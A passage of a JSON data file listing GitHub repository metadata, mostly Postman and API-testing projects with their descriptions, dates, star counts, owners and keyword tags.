","fork":false,"created_at":"2016-06-24T00:01:24Z","updated_at":"2016-06-24T00:06:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19602288,"owner_login":"manishatan","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19602288?v=4","pulled":1,"tags":["test"]},{"id":176357663,"name":"CRUDMongoExpress","full_name":"emirjemmali/CRUDMongoExpress","description":"For testing,you can use postman","fork":false,"created_at":"2019-03-18T19:41:33Z","updated_at":"2019-03-18T19:52:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44018871,"owner_login":"emirjemmali","owner_avatar_url":"https://avatars0.githubusercontent.com/u/44018871?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":216735282,"name":"yapi-plugin-export-postman-json","full_name":"EickeOe/yapi-plugin-export-postman-json","description":null,"fork":false,"created_at":"2019-10-22T06:05:55Z","updated_at":"2020-01-15T09:41:52Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":22267244,"owner_login":"EickeOe","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22267244?v=4","pulled":1,"tags":[]},{"id":99860214,"name":"posty","full_name":"ktxxt/posty","description":"Posty: The postman API tests helper","fork":false,"created_at":"2017-08-09T23:14:53Z","updated_at":"2019-04-16T18:26:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12142567,"owner_login":"ktxxt","owner_avatar_url":"https://avatars3.githubusercontent.com/u/12142567?v=4","pulled":1,"tags":["test"," postman","tests","tests ","help","helper"]},{"id":59457286,"name":"Hummingbird","full_name":"codemeow5/Hummingbird","description":"Postman bot - Deliver the Latest News & Topics","fork":false,"created_at":"2016-05-23T06:24:08Z","updated_at":"2016-10-27T02:52:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12323047,"owner_login":"codemeow5","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12323047?v=4","pulled":1,"tags":["test"]},{"id":194732518,"name":"pagseguro-postman","full_name":"facova/pagseguro-postman","description":"Collection de testes das APIs PagSeguro","fork":false,"created_at":"2019-07-01T19:34:56Z","updated_at":"2019-07-01T19:50:44Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":1779591,"owner_login":"facova","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1779591?v=4","pulled":1,"tags":["test","testes"]},{"id":184942704,"name":"restful_booker_api_postman_tests","full_name":"jchizim/restful_booker_api_postman_tests","description":"Repository to host my Restful Booker postman collection & tests","fork":false,"created_at":"2019-05-04T20:44:50Z","updated_at":"2019-05-12T18:42:27Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":18538282,"owner_login":"jchizim","owner_avatar_url":"https://avatars2.githubusercontent.com/u/18538282?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection","tests","host"]},{"id":79296166,"name":"play-api-proxy-automated-tests","full_name":"joeystevens00/play-api-proxy-automated-tests","description":"Postman tests for play-api-proxy","fork":false,"created_at":"2017-01-18T02:43:40Z","updated_at":"2017-01-18T02:43:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21368456,"owner_login":"joeystevens00","owner_avatar_url":"https://avatars3.githubusercontent.com/u/21368456?v=4","pulled":1,"tags":["test","tests","tests ","play","proxy"]},{"id":61332995,"name":"apis-and-postman-v-000","full_name":"tjnz/apis-and-postman-v-000","description":null,"fork":false,"created_at":"2016-06-16T23:50:29Z","updated_at":"2019-09-11T21:11:50Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5639727,"owner_login":"tjnz","owner_avatar_url":"https://avatars1.githubusercontent.com/u/5639727?v=4","pulled":1,"tags":[]},{"id":192662503,"name":"apiTestSuite","full_name":"zagatoflint/apiTestSuite","description":"An example end-to-end test suite using postman","fork":false,"created_at":"2019-06-19T05:10:58Z","updated_at":"2019-06-29T04:57:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8496083,"owner_login":"zagatoflint","owner_avatar_url":"https://avatars1.githubusercontent.com/u/8496083?v=4","pulled":1,"tags":["test"," postman","example","suite","test suite"]},{"id":112080214,"name":"TestAPIs-Postman-TestPack","full_name":"vikvnsmp/TestAPIs-Postman-TestPack","description":"This contains Postman testpack for TestAPI project.","fork":false,"created_at":"2017-11-26T12:20:45Z","updated_at":"2017-11-26T12:20:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17399964,"owner_login":"vikvnsmp","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17399964?v=4","pulled":1,"tags":["test","contain","testpack"]},{"id":152202460,"name":"Postman-testing-api-with-ci","full_name":"AekachaiBoonruang/Postman-testing-api-with-ci","description":null,"fork":false,"created_at":"2018-10-09T06:55:47Z","updated_at":"2018-10-10T08:24:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":20939168,"owner_login":"AekachaiBoonruang","owner_avatar_url":"https://avatars3.githubusercontent.com/u/20939168?v=4","pulled":1,"tags":[]},{"id":131221156,"name":"postman_rest_api_test_automation","full_name":"DanSchon/postman_rest_api_test_automation","description":"built an automated end to end rest api test collection","fork":false,"created_at":"2018-04-26T23:31:21Z","updated_at":"2018-04-26T23:33:03Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":13282339,"owner_login":"DanSchon","owner_avatar_url":"https://avatars0.githubusercontent.com/u/13282339?v=4","pulled":1,"tags":["test","collect","collection","rest","auto","automat","built","automate","rest api","automated","end to end"]},{"id":201767628,"name":"projeto_WebService_API_Postman","full_name":"marianamunizlima/projeto_WebService_API_Postman","description":null,"fork":false,"created_at":"2019-08-11T13:23:04Z","updated_at":"2019-08-11T13:55:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12008835,"owner_login":"marianamunizlima","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12008835?v=4","pulled":1,"tags":[]},{"id":130323115,"name":"Api_test_Postman_Newman_Jenkin","full_name":"AlishaOne/Api_test_Postman_Newman_Jenkin","description":"Api test,run TestCase use newman in Jenkins","fork":false,"created_at":"2018-04-20T07:05:49Z","updated_at":"2018-10-30T20:08:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32142265,"owner_login":"AlishaOne","owner_avatar_url":"https://avatars2.githubusercontent.com/u/32142265?v=4","pulled":1,"tags":["test","newman"]},{"id":183603558,"name":"api-test-using-postman-ci","full_name":"Keris/api-test-using-postman-ci","description":"Integrate api test with postman and travis ci","fork":false,"created_at":"2019-04-26T09:50:19Z","updated_at":"2019-04-26T10:14:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4636489,"owner_login":"Keris","owner_avatar_url":"https://avatars3.githubusercontent.com/u/4636489?v=4","pulled":1,"tags":["test"," postman","travis"]},{"id":195088011,"name":"apis-and-postman-noukod-000","full_name":"Ricartho/apis-and-postman-noukod-000","description":null,"fork":false,"created_at":"2019-07-03T16:07:48Z","updated_at":"2019-09-11T21:10:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49238667,"owner_login":"Ricartho","owner_avatar_url":"https://avatars0.githubusercontent.com/u/49238667?v=4","pulled":1,"tags":[]},{"id":244552905,"name":"API-salesforce-openidConnect.postman","full_name":"mathieupoulenard-pv/API-salesforce-openidConnect.postman","description":null,"fork":false,"created_at":"2020-03-03T05:49:45Z","updated_at":"2020-03-03T05:50:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":61420076,"owner_login":"mathieupoulenard-pv","owner_avatar_url":"https://avatars0.githubusercontent.com/u/61420076?v=4","pulled":1,"tags":[]},{"id":243624683,"name":"explorer-rest-api-tests-postman","full_name":"ArturWieczorek/explorer-rest-api-tests-postman","description":"Cardano Explorer REST API tests created with Postman","fork":false,"created_at":"2020-02-27T21:54:53Z","updated_at":"2020-03-12T22:08:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2938515,"owner_login":"ArturWieczorek","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2938515?v=4","pulled":1,"tags":["test","create","tests","tests "]},{"id":101767841,"name":"postman-collections","full_name":"justinmccoy/postman-collections","description":"My Postman API Collections, simplifying usage, test, and sharing","fork":false,"created_at":"2017-08-29T14:02:40Z","updated_at":"2017-11-29T23:49:39Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":29233334,"owner_login":"justinmccoy","owner_avatar_url":"https://avatars2.githubusercontent.com/u/29233334?v=4","pulled":1,"tags":["test","simplify","simplifying"]},{"id":147935327,"name":"postman-collection","full_name":"vibhudadhichi/postman-collection","description":"Automated API testing framework using Postman Jenkins Newman","fork":false,"created_at":"2018-09-08T13:22:22Z","updated_at":"2018-09-08T13:23:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14141170,"owner_login":"vibhudadhichi","owner_avatar_url":"https://avatars1.githubusercontent.com/u/14141170?v=4","pulled":1,"tags":["test","testing","framework"]},{"id":81129803,"name":"apis-and-postman-v-000","full_name":"DEV-learn-co-students/apis-and-postman-v-000","description":null,"fork":false,"created_at":"2017-02-06T20:26:32Z","updated_at":"2017-02-06T20:26:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8825410,"owner_login":"DEV-learn-co-students","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8825410?v=4","pulled":1,"tags":[]},{"id":176049895,"name":"postman-restful-booker","full_name":"joannalaine/postman-restful-booker","description":"Collections of API tests written in Postman for the Restful Booker API","fork":false,"created_at":"2019-03-17T03:02:05Z","updated_at":"2019-04-08T06:45:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":455840,"owner_login":"joannalaine","owner_avatar_url":"https://avatars3.githubusercontent.com/u/455840?v=4","pulled":1,"tags":["test","tests","tests ","written"]},{"id":97866209,"name":"rest-apii","full_name":"sandysanthosh/rest-apii","description":null,"fork":false,"created_at":"2017-07-20T18:24:15Z","updated_at":"2018-07-14T15:20:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11579239,"owner_login":"sandysanthosh","owner_avatar_url":"https://avatars3.githubusercontent.com/u/11579239?v=4","pulled":1,"tags":[]},{"id":204039033,"name":"postman-qademo","full_name":"cpressler/postman-qademo","description":"An example of using maven and postman for testing apis","fork":false,"created_at":"2019-08-23T17:04:58Z","updated_at":"2019-08-23T20:35:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1030822,"owner_login":"cpressler","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1030822?v=4","pulled":1,"tags":["test"," postman","testing","example","maven"]},{"id":175955873,"name":"Postman-P01","full_name":"Shiranthaw/Postman-P01","description":"Postman API test with Jenkins integration","fork":false,"created_at":"2019-03-16T10:09:16Z","updated_at":"2019-03-16T11:21:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29886962,"owner_login":"Shiranthaw","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29886962?v=4","pulled":1,"tags":["test","integration"]},{"id":170028377,"name":"Test-Automation-API-Testing-with-Postman","full_name":"sza313/Test-Automation-API-Testing-with-Postman","description":"API testing sample project with Postman","fork":false,"created_at":"2019-02-10T21:18:02Z","updated_at":"2019-02-10T21:26:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24241788,"owner_login":"sza313","owner_avatar_url":"https://avatars0.githubusercontent.com/u/24241788?v=4","pulled":1,"tags":["test","testing","sample"]},{"id":126024343,"name":"postman","full_name":"TakuCoder/postman","description":"Postman is a REST API testing tool for Android devices. It helps to test REST API without desktops. can submit a HTTP request with several headers, parameters and raw request body by 6 different HTTP methods including GET, POST, HEAD, PUT, DELETE and PATCH. HTTP response can be shown as three styles including pretty, raw and preview. Response status code and headers are also supported in Postman-Android. Currently in Development Stage","fork":false,"created_at":"2018-03-20T13:47:04Z","updated_at":"2020-03-09T08:39:18Z","stargazers_count":3,"watchers_count":3,"forks":2,"watchers":3,"score":1,"owner_id":13318707,"owner_login":"TakuCoder","owner_avatar_url":"https://avatars1.githubusercontent.com/u/13318707?v=4","pulled":1,"tags":["test","testing","request","tool","code","help","response","rent","stat","view","method","ever","support","methods","including","header","status","parameter","review","style","helps","desktop","three","supported","several","devices","desktops"]},{"id":218501869,"name":"PyTestApiAuto","full_name":"kayie77/PyTestApiAuto","description":"pytest+allure基于python的接口自动化集成框架：发送请求、数据自动采集（postman抓包的json数据）、全局配置、接口断言、日志记录、allure报告","fork":false,"created_at":"2019-10-30T10:31:00Z","updated_at":"2020-03-07T08:38:55Z","stargazers_count":15,"watchers_count":15,"forks":8,"watchers":15,"score":1,"owner_id":18409736,"owner_login":"kayie77","owner_avatar_url":"https://avatars3.githubusercontent.com/u/18409736?v=4","pulled":1,"tags":["test","json","python","pytest"]},{"id":155298347,"name":"restler","full_name":"tiagohm/restler","description":"Restler is a beautiful and powerful Android app for quickly testing REST API anywhere and anytime.","fork":false,"created_at":"2018-10-30T00:11:24Z","updated_at":"2020-03-29T22:27:34Z","stargazers_count":19,"watchers_count":19,"forks":4,"watchers":19,"score":1,"owner_id":16495338,"owner_login":"tiagohm","owner_avatar_url":"https://avatars3.githubusercontent.com/u/16495338?v=4","pulled":1,"tags":["test","testing","powerful","quickly"]},{"id":143494286,"name":"API","full_name":"ces-hackathon/API","description":"Postman API documentation for creating mock server API and postman test scripts","fork":false,"created_at":"2018-08-04T03:23:55Z","updated_at":"2018-08-05T03:00:35Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42081563,"owner_login":"ces-hackathon","owner_avatar_url":"https://avatars2.githubusercontent.com/u/42081563?v=4","pulled":1,"tags":["test"," postman","script","server","document","documentation","scripts","mock","creating"]},{"id":249345615,"name":"postman","full_name":"pooja1803/postman","description":"API test","fork":false,"created_at":"2020-03-23T05:43:25Z","updated_at":"2020-03-23T05:44:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":60913634,"owner_login":"pooja1803","owner_avatar_url":"https://avatars2.githubusercontent.com/u/60913634?v=4","pulled":1,"tags":["test"]},{"id":238456574,"name":"Postman","full_name":"SaneleNkosi/Postman","description":"API testing","fork":false,"created_at":"2020-02-05T13:27:37Z","updated_at":"2020-02-05T13:27:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":60699373,"owner_login":"SaneleNkosi","owner_avatar_url":"https://avatars2.githubusercontent.com/u/60699373?v=4","pulled":1,"tags":["test","testing"]},{"id":209939186,"name":"melody-api-test-tool","full_name":"melodyWxy/melody-api-test-tool","description":"this is a web tool for testing apis, like postman…","fork":false,"created_at":"2019-09-21T06:51:46Z","updated_at":"2020-02-25T03:54:20Z","stargazers_count":2,"watchers_count":2,"forks":0,"watchers":2,"score":1,"owner_id":44901373,"owner_login":"melodyWxy","owner_avatar_url":"https://avatars0.githubusercontent.com/u/44901373?v=4","pulled":1,"tags":["test"," postman","testing","tool"]},{"id":51982148,"name":"apiTesting","full_name":"aditisen/apiTesting","description":"api testing using postman","fork":false,"created_at":"2016-02-18T05:38:36Z","updated_at":"2016-02-18T05:38:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17308486,"owner_login":"aditisen","owner_avatar_url":"https://avatars0.githubusercontent.com/u/17308486?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":169745593,"name":"PostmanRestApiBooks","full_name":"milenshark/PostmanRestApiBooks","description":"postman_test","fork":false,"created_at":"2019-02-08T14:18:33Z","updated_at":"2020-02-15T07:56:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13328009,"owner_login":"milenshark","owner_avatar_url":"https://avatars3.githubusercontent.com/u/13328009?v=4","pulled":1,"tags":["test"]},{"id":187013139,"name":"PostmanAPIAutomationTest","full_name":"yogeshdawkhar/PostmanAPIAutomationTest","description":"postmantest","fork":false,"created_at":"2019-05-16T11:21:10Z","updated_at":"2019-11-03T09:08:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8858775,"owner_login":"yogeshdawkhar","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8858775?v=4","pulled":1,"tags":["test","postmantest"]},{"id":178266865,"name":"postmanProjectApi","full_name":"jdantasl/postmanProjectApi","description":null,"fork":false,"created_at":"2019-03-28T19:09:30Z","updated_at":"2019-04-03T05:08:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15002632,"owner_login":"jdantasl","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15002632?v=4","pulled":1,"tags":[]},{"id":219868156,"name":"PostmanProject","full_name":"Purushothamanan/PostmanProject","description":"Run Api testing using postman","fork":false,"created_at":"2019-11-05T23:11:42Z","updated_at":"2019-11-05T23:29:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55029541,"owner_login":"Purushothamanan","owner_avatar_url":"https://avatars2.githubusercontent.com/u/55029541?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":89327717,"name":"postman1","full_name":"Jyoti343/postman1","description":"TO test APIs through Postman ","fork":false,"created_at":"2017-04-25T06:55:26Z","updated_at":"2018-06-08T14:29:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15262174,"owner_login":"Jyoti343","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15262174?v=4","pulled":1,"tags":["test"]},{"id":125187204,"name":"Postman","full_name":"HatimCrypto/Postman","description":"Postman API tests for CryptoCompare","fork":false,"created_at":"2018-03-14T09:23:56Z","updated_at":"2018-04-27T08:21:47Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":36845199,"owner_login":"HatimCrypto","owner_avatar_url":"https://avatars2.githubusercontent.com/u/36845199?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":82885557,"name":"APIAddressPostman","full_name":"clodio/APIAddressPostman","description":null,"fork":false,"created_at":"2017-02-23T04:52:00Z","updated_at":"2017-02-23T04:52:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1901229,"owner_login":"clodio","owner_avatar_url":"https://avatars0.githubusercontent.com/u/1901229?v=4","pulled":1,"tags":[]},{"id":193086268,"name":"DumApi","full_name":"Kimserey/DumApi","description":"Postman/Newman integration test","fork":false,"created_at":"2019-06-21T11:24:56Z","updated_at":"2019-06-30T21:16:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2263777,"owner_login":"Kimserey","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2263777?v=4","pulled":1,"tags":["test","integration"]},{"id":250930083,"name":"TesteAPI","full_name":"ultramari/TesteAPI","description":"teste json com postman","fork":false,"created_at":"2020-03-29T01:29:03Z","updated_at":"2020-03-29T01:29:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42254805,"owner_login":"ultramari","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42254805?v=4","pulled":1,"tags":["test"," postman","json"]},{"id":128648282,"name":"postman-api-test","full_name":"soledad-fernandez/postman-api-test","description":"API testing using postman","fork":false,"created_at":"2018-04-08T14:14:47Z","updated_at":"2018-04-08T14:14:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10940943,"owner_login":"soledad-fernandez","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10940943?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":123917517,"name":"POSTMANTEST","full_name":"kamal-bhatt/POSTMANTEST","description":"use for testing api","fork":false,"created_at":"2018-03-05T12:39:46Z","updated_at":"2019-01-16T06:50:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22490116,"owner_login":"kamal-bhatt","owner_avatar_url":"https://avatars2.githubusercontent.com/u/22490116?v=4","pulled":1,"tags":["test","testing"]},{"id":194663426,"name":"Humanitec_api_test","full_name":"munenemaxwell/Humanitec_api_test","description":"Automated postman tests ","fork":false,"created_at":"2019-07-01T11:53:25Z","updated_at":"2019-07-01T12:12:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33632450,"owner_login":"munenemaxwell","owner_avatar_url":"https://avatars2.githubusercontent.com/u/33632450?v=4","pulled":1,"tags":["test"," postman","tests","tests ","postman tests"]},{"id":132426417,"name":"postman-apimatic-integration-test","full_name":"boeystephen/postman-apimatic-integration-test","description":"postman-apimatic-integration-test","fork":false,"created_at":"2018-05-07T07:54:39Z","updated_at":"2018-05-07T08:34:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12846764,"owner_login":"boeystephen","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12846764?v=4","pulled":1,"tags":["test","integration","apimatic"]},{"id":201450171,"name":"APItest","full_name":"steffmcmullan/APItest","description":"testing API s with Postman","fork":false,"created_at":"2019-08-09T10:56:21Z","updated_at":"2019-08-09T12:37:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51993783,"owner_login":"steffmcmullan","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51993783?v=4","pulled":1,"tags":["test","testing"]},{"id":217512699,"name":"PostmanTest-WeatherTest","full_name":"SnehaRajB/PostmanTest-WeatherTest","description":"Postman Tests for testing Weather API","fork":false,"created_at":"2019-10-25T10:45:54Z","updated_at":"2019-10-25T10:46:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57000230,"owner_login":"SnehaRajB","owner_avatar_url":"https://avatars0.githubusercontent.com/u/57000230?v=4","pulled":1,"tags":["test","testing"]},{"id":81484032,"name":"newman201702","full_name":"mpmartins1970/newman201702","description":"testes api - postman/newman","fork":false,"created_at":"2017-02-09T18:59:10Z","updated_at":"2017-02-09T18:59:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7726895,"owner_login":"mpmartins1970","owner_avatar_url":"https://avatars3.githubusercontent.com/u/7726895?v=4","pulled":1,"tags":["test"," postman","newman","testes"]},{"id":248045436,"name":"Nobia_TA_API_V1","full_name":"Nobiadigital/Nobia_TA_API_V1","description":"postman tests for api","fork":false,"created_at":"2020-03-17T18:33:59Z","updated_at":"2020-03-18T05:49:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24243130,"owner_login":"Nobiadigital","owner_avatar_url":"https://avatars1.githubusercontent.com/u/24243130?v=4","pulled":1,"tags":["test","tests","tests ","postman tests"]},{"id":128982622,"name":"apiTest-Postman-Newman","full_name":"leokaneko/apiTest-Postman-Newman","description":"API test using Postman and Newman","fork":false,"created_at":"2018-04-10T19:07:37Z","updated_at":"2018-04-16T20:19:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12562214,"owner_login":"leokaneko","owner_avatar_url":"https://avatars1.githubusercontent.com/u/12562214?v=4","pulled":1,"tags":["test"]},{"id":145812541,"name":"postman_APItest","full_name":"yuanmei19930510/postman_APItest","description":"practice postman to test smarthome","fork":false,"created_at":"2018-08-23T06:45:22Z","updated_at":"2018-08-23T08:22:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18065547,"owner_login":"yuanmei19930510","owner_avatar_url":"https://avatars1.githubusercontent.com/u/18065547?v=4","pulled":1,"tags":["test"," postman","practice","home","smart","smarthome"]},{"id":140146245,"name":"Postman_api","full_name":"hezuier/Postman_api","description":null,"fork":false,"created_at":"2018-07-08T07:18:38Z","updated_at":"2018-07-08T07:18:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38390518,"owner_login":"hezuier","owner_avatar_url":"https://avatars2.githubusercontent.com/u/38390518?v=4","pulled":1,"tags":[]},{"id":241375226,"name":"postman-api","full_name":"martabtab/postman-api","description":null,"fork":false,"created_at":"2020-02-18T13:58:33Z","updated_at":"2020-02-18T13:58:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57708251,"owner_login":"martabtab","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57708251?v=4","pulled":1,"tags":[]},{"id":208335406,"name":"api-postman","full_name":"HeepApp/api-postman","description":null,"fork":false,"created_at":"2019-09-13T19:46:36Z","updated_at":"2019-09-20T12:47:30Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":55297536,"owner_login":"HeepApp","owner_avatar_url":"https://avatars0.githubusercontent.com/u/55297536?v=4","pulled":1,"tags":[]},{"id":160582504,"name":"taskAPI","full_name":"Kdodd1/taskAPI","description":"Create API test with POSTMAN","fork":false,"created_at":"2018-12-05T21:44:05Z","updated_at":"2018-12-10T22:22:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35957255,"owner_login":"Kdodd1","owner_avatar_url":"https://avatars0.githubusercontent.com/u/35957255?v=4","pulled":1,"tags":["test"]},{"id":240101004,"name":"Postman-API","full_name":"ahutch21/Postman-API","description":"Files for testing API in Postman","fork":false,"created_at":"2020-02-12T19:49:10Z","updated_at":"2020-02-12T19:49:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31278443,"owner_login":"ahutch21","owner_avatar_url":"https://avatars0.githubusercontent.com/u/31278443?v=4","pulled":1,"tags":["test","testing"]},{"id":242461467,"name":"API_Postman","full_name":"sahaiswat/API_Postman","description":null,"fork":false,"created_at":"2020-02-23T05:22:31Z","updated_at":"2020-02-23T22:32:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":61317806,"owner_login":"sahaiswat","owner_avatar_url":"https://avatars2.githubusercontent.com/u/61317806?v=4","pulled":1,"tags":[]},{"id":141311179,"name":"ApiTest","full_name":"andrivera/ApiTest","description":"This is a test  Api for postman ","fork":false,"created_at":"2018-07-17T15:47:07Z","updated_at":"2018-07-17T16:16:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5472427,"owner_login":"andrivera","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5472427?v=4","pulled":1,"tags":["test"," postman"]},{"id":117924168,"name":"api-postman","full_name":"jogijatin15/api-postman","description":"API testing using Newman (Postman CLI)","fork":false,"created_at":"2018-01-18T03:01:47Z","updated_at":"2018-03-14T05:10:14Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":17865993,"owner_login":"jogijatin15","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17865993?v=4","pulled":1,"tags":["test","testing"]},{"id":108194091,"name":"projectRoles_PostmanTests","full_name":"shawnmarie/projectRoles_PostmanTests","description":"collection of Postman api tests for the Project Roles endpoints","fork":false,"created_at":"2017-10-24T23:15:06Z","updated_at":"2017-10-24T23:15:06Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":9804042,"owner_login":"shawnmarie","owner_avatar_url":"https://avatars2.githubusercontent.com/u/9804042?v=4","pulled":1,"tags":["test","collect","collection","tests","tests ","endpoint","points","endpoints"]},{"id":170375084,"name":"PostmanIntegration","full_name":"mchartrand-brt/PostmanIntegration","description":"A sample repo to test integrating a Postman API test into CI/CD","fork":false,"created_at":"2019-02-12T19:08:28Z","updated_at":"2019-02-13T14:12:46Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43351142,"owner_login":"mchartrand-brt","owner_avatar_url":"https://avatars2.githubusercontent.com/u/43351142?v=4","pulled":1,"tags":["test","repo","sample","rating","integrating"]},{"id":206964139,"name":"api-tests-postman","full_name":"NageshJoy007/api-tests-postman","description":"Perform api testing using postman","fork":false,"created_at":"2019-09-07T12:19:39Z","updated_at":"2019-09-07T16:37:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16208506,"owner_login":"NageshJoy007","owner_avatar_url":"https://avatars3.githubusercontent.com/u/16208506?v=4","pulled":1,"tags":["test"," postman","testing","form"]},{"id":199984139,"name":"postman-api-test","full_name":"superavocado/postman-api-test","description":"GitHub API test using postman","fork":false,"created_at":"2019-08-01T05:38:46Z","updated_at":"2019-08-01T12:26:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45592261,"owner_login":"superavocado","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45592261?v=4","pulled":1,"tags":["test"," 